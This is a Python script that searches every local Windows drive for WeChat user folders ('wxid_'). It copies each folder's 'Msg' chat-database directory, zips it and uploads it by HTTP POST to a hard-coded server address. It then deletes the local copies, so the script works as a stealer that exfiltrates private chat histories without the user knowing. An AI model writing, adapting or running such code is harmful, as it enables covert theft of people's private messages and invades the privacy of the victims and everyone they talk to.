import requests
import wmi
import os
import shutil
URL = "http://localhost:944"

def upload_file(file_path, url):
    """
    上传文件到指定URL

    :param file_path: 要上传的文件路径
    :param url: 目标URL
    :return: 服务器响应内容
    """
    # 打开文件
    with open(file_path, 'rb') as file:
        # 上传的文件
        files = {'file': file}

        # 发送POST请求上传文件
        response = requests.post(url, files=files)

    # 返回响应内容
    return response.text


def copy_directory(src_dir, dest_dir):
    """
    复制目录及其所有内容

    :param src_dir: 源目录路径
    :param dest_dir: 目标目录路径
    """
    try:
        # 判断源目录是否存在
        if not os.path.exists(src_dir):
            print(f"源目录 '{src_dir}' 不存在。")
            return

        # 复制目录及其内容，直接覆盖
        shutil.copytree(src_dir, dest_dir, dirs_exist_ok=True)
        print(f"目录 '{src_dir}' 已成功复制到 '{dest_dir}'")
    except Exception as e:
        print(f"发生错误: {e}")


def compress_directory_to_zip(src_dir, zip_filename):
    """
    将目录压缩成ZIP文件

    :param src_dir: 要压缩的源目录路径
    :param zip_filename: 目标ZIP文件的路径（包括文件名）
    """
    try:
        # 压缩目录
        shutil.make_archive(zip_filename, 'zip', src_dir)
        print(f"目录 '{src_dir}' 已成功压缩到 '{zip_filename}.zip'")
    except Exception as e:
        print(f"发生错误: {e}")


def get_wx():
    try:
        # 初始化 WMI 客户端
        c = wmi.WMI()
        i = 0
        # 获取所有的磁盘驱动器
        for disk in c.Win32_LogicalDisk(DriveType=3):  # 只获取本地磁盘驱动器
            drive = disk.DeviceID  # 获取磁盘盘符
            print(f"正在检查: {drive}")

            # 遍历指定磁盘上的所有文件夹
            for root, dirs, files in os.walk(drive + "\\"):
                for dir_name in dirs:
                    if dir_name.startswith("wxid_"):
                        try:
                            print(dir_name)
                            wxid_path = os.path.join(root, dir_name)
                            print(wxid_path)
                            # 复制Msg 然后压缩 上传
                            src_msg = wxid_path + "\\Msg"
                            dest_msg = wxid_path + "\\Msg_backup"
                            copy_directory(src_msg, dest_msg)
                            # 压缩为i.zip
                            zip_file = wxid_path + "\\" + str(i)
                            compress_directory_to_zip(dest_msg, zip_file)
                            upload_file(zip_file + ".zip", URL)
                            i = i + 1
                        finally:
                            # clean up
                            shutil.rmtree(dest_msg)
                            os.remove(zip_file + ".zip")

    except Exception as e:
        print(str(e))


if __name__ == "__main__":
    get_wx()
